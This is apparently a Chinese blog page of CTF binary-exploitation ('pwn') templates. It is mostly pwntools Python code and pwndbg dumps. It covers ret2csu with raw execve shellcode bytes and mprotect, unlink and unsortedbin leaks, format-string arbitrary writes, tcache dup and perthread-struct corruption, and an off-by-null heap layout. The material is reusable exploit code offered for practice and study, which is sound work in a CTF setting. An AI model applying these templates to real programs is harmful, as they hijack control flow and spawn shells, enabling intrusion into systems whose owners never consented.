<h2 id="Shellcode模板"><a href="#Shellcode模板" class="headerlink" title="Shellcode模板"></a>Shellcode模板</h2><p><strong>ret2csu</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. read shellcode to bss_addr</span></span><br><span class="line">shellcode=<span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.amd64.linux.sh(),arch=&#x27;amd64&#x27;) </span></span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x400</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. read bss_addr to got[0]</span></span><br><span class="line">shellcode_got= got[<span class="number">0</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(shellcode_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(bss_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. read mprotect_libc to got[1]</span></span><br><span class="line">mprot_got= got[<span class="number">1</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(mprot_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(mprotect_libc))</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, mprot_got, <span class="number">7</span>, <span class="number">0x1000</span>, <span class="number">0x600000</span>, main_addr)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, shellcode_got, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>这种进攻方式的核心就在于：把目标地址写入空白的GOT表</p>
<h2 id="Unlink攻击模板"><a href="#Unlink攻击模板" class="headerlink" title="Unlink攻击模板"></a>Unlink攻击模板</h2><p><strong>基于chunk_list</strong></p>
<p>通常就是这么个造型，根据具体需要进行修改（这种方式高libc版本用不了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk1</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk2</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">list_addr_chunk2=list_addr+<span class="number">0x10</span> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x18</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xa0</span>)+p64(<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,<span class="number">0xb0</span>,payload) <span class="comment">#fake_chunk2</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#list_addr_chunk2：就是目标chunk(chunk2)的FD指针，通过list_addr比较好寻找</span></span><br><span class="line"><span class="comment">#注意：例题的&quot;chunk[0]&quot;没有写入东西</span></span><br></pre></td></tr></table></figure>
<p>通常都是修改“chunk2”，释放“chunk3”，留一个“chunk1”进行初始化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg list_addr(buf[<span class="number">0</span>])</span><br><span class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000e0a020</span></span><br><span class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000602138</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#fake_chunk2</span></span><br><span class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#演示程序的buf[0]没有chunk</span></span><br><span class="line"><span class="comment">#buf[1]为chunk1，用于初始化</span></span><br><span class="line"><span class="comment">#buf[2]为fake_chunk2，是攻击对象</span></span><br><span class="line"><span class="comment">#buf[3]为chunk3，已经被free</span></span><br></pre></td></tr></table></figure>
<p>接下来修改“chunk2”就可以直接修改“list_addr”（“buf[0]”）了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target1&#x27;</span>]) <span class="comment">#fake_chunk0</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target2&#x27;</span>]) <span class="comment">#fake_chunk1</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target3&#x27;</span>]) <span class="comment">#fake_chunk2</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>​        // 程序会在“buf[-1]”（buf[2-3]）开始写入数据</p>
<p><strong>基于heap_addr</strong>（泄露“heap_addr”+泄露“libc_base”+后续利用）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b00</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">heap_addr=leak_addr-<span class="number">240</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>) <span class="comment"># fake chunk-&gt;size</span></span><br><span class="line">payload+=p64(heap_addr+<span class="number">0x18</span>)+p64(heap_addr+<span class="number">0x20</span>)+p64(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xb0</span>))<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># fake chunk-&gt;size=0xb1+0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># after unlink</span></span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAA&#x27;</span>)<span class="comment">#2(malloc form unsortedbin &quot;0x40+0x10&quot;+&quot;0x60+0x10&quot;)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;BBBB&#x27;</span>)<span class="comment">#3(avoid top chunk and adjust the size of unsortedbin)</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># lead chunk1 to fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) </span><br><span class="line"><span class="comment"># make fake_target to unsortedbin and then to fastbin(0x70)</span></span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment"># malloc the fake_target and change it</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先构造泄露 heap_addr 的结构，再构造泄露 libc_base 的结构</li>
<li>要求 unlink 跳过中间那个chunk，基于这点构造“fake chunk-&gt;size”和“last chunk-&gt;fake presize”</li>
<li>释放chunk1，使chunk1进入fastbin</li>
<li>申请“0x60”字节的目的有二：防止 top chunk 合并，调整 unsortedbin 的大小（使其可以进入fastbin）</li>
<li>申请“0xC0”字节释放后，可以控制已经在fastbin中的chunk1，从而申请到目标地址</li>
</ul>
<h2 id="Unsortedbin-Leak模板"><a href="#Unsortedbin-Leak模板" class="headerlink" title="Unsortedbin Leak模板"></a>Unsortedbin Leak模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;C&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># 注意:这里要先释放后申请的chunk,不然程序不会打印(不知道原因)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk1：leak heap_addr</li>
<li>chunk3：leak main_arena</li>
</ul>
<h2 id="格式化字符串漏洞模板"><a href="#格式化字符串漏洞模板" class="headerlink" title="格式化字符串漏洞模板"></a>格式化字符串漏洞模板</h2><p><strong>WAA模板</strong></p>
<p>通常需要在两片内存空间中，最后指向的地址相同（“偏移N”，“偏移M”）</p>
<p>例如：实现“ 目标地址 =&gt; shellcode ”</p>
<ul>
<li>找寻：最后指向地址相同的两片空间（“偏移N”，“偏移M”）</li>
<li>把“目标地址”写入“偏移N”</li>
<li>对应的“偏移M”最终也会指向“目标地址”</li>
<li>把“shellcode”写入“偏移M”（其实就是把“shellcode”写入“目标地址”了）</li>
</ul>
<p>通常需要分段写入地址，先写入高地址，所以模板为：（每次修改2字节）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">6</span>) <span class="comment"># last 6~8</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">3</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">4</span>) <span class="comment"># last 4~6</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">2</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">2</span>) <span class="comment"># last 2~4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">1</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack) <span class="comment"># last 0~2</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>(shellcode_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p><strong>leak模板</strong></p>
<p>格式化字符串的 leak 很简单，只需要输入若干“-%p”，并在GDB中确认格式化参数的地址后，就可以计算出各个地址的偏移了</p>
<p>​        // 前6个是寄存器中存放的值（在stack中也有），后续的信息才是重点</p>
<p>实现 leak 了之后，首先需要寻找“最后指向地址相同”的内存空间，方便以后的 WAA</p>
<h2 id="Tcache-Attack-模板"><a href="#Tcache-Attack-模板" class="headerlink" title="Tcache Attack 模板"></a>Tcache Attack 模板</h2><p>Tcache Attack的形式多种多样，遇到一个记录一个</p>
<p><strong>Tcache leak</strong></p>
<p>如果程序拥有“打印模块”，就先可以填满 Tcachebin，然后打 Unsortedbin leak</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">9</span>):</span><br><span class="line">	add(i,<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">	</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># chunk8 into Unsortedbin </span></span><br></pre></td></tr></table></figure>
<p>申请9个chunk：7个填Tcachebin，1个leak，1个防止和合并Top chunk</p>
<p><strong>Tcache dup</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(index)</span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">edit(index,p64(target))</span><br><span class="line">add(size)</span><br><span class="line">add(size) <span class="comment"># malloc the target</span></span><br></pre></td></tr></table></figure>
<ul>
<li>释放 chunk ，覆盖 “chunk-&gt;FD，chunk-&gt;BK” 为“\x00” ，再次释放</li>
<li>利用修改模块覆写上 target</li>
<li>连续两次申请获取 target</li>
</ul>
<p><strong>Tcache perthread corruption</strong></p>
<p>一，打 count 获取 unsorted chunk：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(index) <span class="comment"># Tcache dup</span></span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>) <span class="comment"># cover count to &#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(index,p64(heap_base + <span class="number">0x10</span>)) <span class="comment"># tcache_perthread_struct-&gt;next</span></span><br><span class="line">add(size)</span><br><span class="line">add(size,payload) <span class="comment"># malloc the tcache_perthread_struct</span></span><br><span class="line">delete(index)</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：tcache-&gt;next 和常规的FD指针相似但不同，FD指向 nextchunk-&gt;presize ，而 next 指向 nextchunk-&gt;next </li>
<li>利用 Tcache dup 申请到“tcache_perthread_struct”（第一个chunk）</li>
<li>修改对应“tcache_perthread_struct-&gt;size”的“count”为“7”（偏移可以在GDB中看）</li>
<li>释放“tcache_perthread_struct”使其进入“unsortedbin”</li>
</ul>
<p>二，打 tcache_entry 劫持 tcachebin：</p>
<p>这个很灵活，不好用代码表示，这里我挂上几个堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, p16(<span class="built_in">stdout</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + b<span class="string">&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// delete</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x558b1cfcd0b0</span> ◂— <span class="number">0x7fef51cc13cd</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x558b1cfcd060</span> ◂— <span class="number">0x1f1</span> </span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558ce25c44cd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意：因为 tcache 的性质，在对应“size的tcache”中写入地址，就会申请这个地址作为“tcache-&gt;next”（也就是说，数据会直接写入该地址）</li>
<li>关键在于：使 <code>&#39;0x40&#39; tcache</code> 中装有 <code>&#39;0x50&#39; tcache addr</code> ，使其可以通过申请“0x30”来修改 <code>&#39;0x50&#39; tcache</code> 的地址（劫持大小为“0x50”的tcachebin）</li>
</ul>
<h2 id="Off-By-Null模板（基于read）"><a href="#Off-By-Null模板（基于read）" class="headerlink" title="Off-By-Null模板（基于read）"></a>Off-By-Null模板（基于read）</h2><p>有些程序为了“打印模块”的安全性，会在read完成后加一个“\x00”，造成了off-by-null</p>
<p>例如：<em>( </em>(&amp;list + index)  + read(0, *(&amp;list + index) , size) ) = 0 </p>
<p><strong>有Tcache：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">	add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF0</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>覆盖前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55a67dfb3450</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x0000000000000101</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x55a67dfb3460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55a67dfb3470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<p>覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x561f0e5bf450</span>:	<span class="number">0x0000000000000200</span>	<span class="number">0x0000000000000100</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x561f0e5bf460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x561f0e5bf470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
